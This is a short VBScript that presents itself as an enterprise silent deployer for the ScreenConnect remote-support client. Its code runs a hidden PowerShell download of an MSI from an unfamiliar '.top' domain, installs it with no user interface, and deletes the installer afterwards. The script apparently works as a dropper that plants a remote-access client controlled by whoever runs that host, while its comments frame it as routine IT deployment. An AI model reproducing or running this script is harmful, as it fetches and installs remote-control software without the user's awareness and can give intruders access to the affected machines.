' ScreenConnect Enterprise Silent Deployer
' Optimized for: Zero User Interaction & Background Deployment
' Note: Designed for execution via System Management Tools (Intune/SCCM/GPO)

Option Explicit

' --- Configuration ---
Dim AppName, MsiUrl, LogFile, InstallerPath, WshShell, FSO
AppName       = "ScreenConnect"
' TODO: Ensure this is a direct link to the .msi file
MsiUrl        = "https://www.wpkm65.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest" 
InstallerPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\SC_Installer.msi"
LogFile       = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\SC_Deploy.log"

Set WshShell = CreateObject("WScript.Shell")
Set FSO      = CreateObject("Scripting.FileSystemObject")

' --- 1. Silent Permission Validation ---
' We don't show a popup, but we log if we aren't Admin so we know why it failed later.
Dim bIsAdmin: bIsAdmin = False
On Error Resume Next
WshShell.RegRead("HKEY_USERS\S-1-5-19\Environment\TEMP")
If Err.Number = 0 Then bIsAdmin = True
On Error GoTo 0

Call WriteLog("INFO", "--- Starting Silent Deployment ---")
If Not bIsAdmin Then 
    Call WriteLog("WARN", "Running without Admin rights. MSI installation may fail.")
End If

' --- 2. Download Payload ---
Call WriteLog("INFO", "Downloading: " & MsiUrl)
Dim downloadCmd: downloadCmd = "powershell.exe -WindowStyle Hidden -NoProfile -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('" & MsiUrl & "', '" & InstallerPath & "')"""

' 0 = Hide window, True = Wait for completion
Dim dlResult: dlResult = WshShell.Run(downloadCmd, 0, True)

If dlResult <> 0 Or Not FSO.FileExists(InstallerPath) Then
    Call WriteLog("ERROR", "Download failed (Code: " & dlResult & ")")
    WScript.Quit 1
End If

' --- 3. Execute Silent Install ---
Call WriteLog("INFO", "Executing MSI...")
' /i = Install, /qn = Quiet/No UI, /norestart
Dim instResult: instResult = WshShell.Run("msiexec.exe /i """ & InstallerPath & """ /qn /norestart", 0, True)

' --- 4. Cleanup ---
If FSO.FileExists(InstallerPath) Then FSO.DeleteFile InstallerPath
Call WriteLog("INFO", "Deployment finished with Exit Code: " & instResult)
WScript.Quit instResult

Sub WriteLog(sType, sMessage)
    On Error Resume Next
    Dim objLog: Set objLog = FSO.OpenTextFile(LogFile, 8, True)
    objLog.WriteLine "[" & Now & "] [" & sType & "] " & sMessage
    objLog.Close
End Sub
